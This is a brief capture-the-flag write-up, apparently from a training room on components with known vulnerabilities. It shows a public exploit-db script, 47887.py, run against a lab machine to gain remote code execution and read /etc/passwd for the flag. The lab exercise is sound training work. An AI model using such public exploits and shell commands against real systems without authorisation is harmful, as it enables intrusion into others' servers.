# [Day 9] Components With Known Vulnerabilities
> - Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.
> - For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan,\
you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an\
unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on [exploit-db](https://www.exploit-db.com/exploits/41962).

## Writeup
Read the supporting material from **[Task 28]** to **[Task 29]** to know about Components with known vulnerabilities.

**[Task 29]**
 - You can either use [exploit-db](https://www.exploit-db.com/exploits/41962) or [Online Book Store 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/47887) as exploit script. But, both works good.
 - Run the exploit by 
 
        $ python 47887.py https://MACHINE_IP
        RCE $ whoami
        www-data
        RCE $ wc -c /etc/passwd
 - You will get the number of characters are in /etc/passwd as 4 digits. That's the flag!  
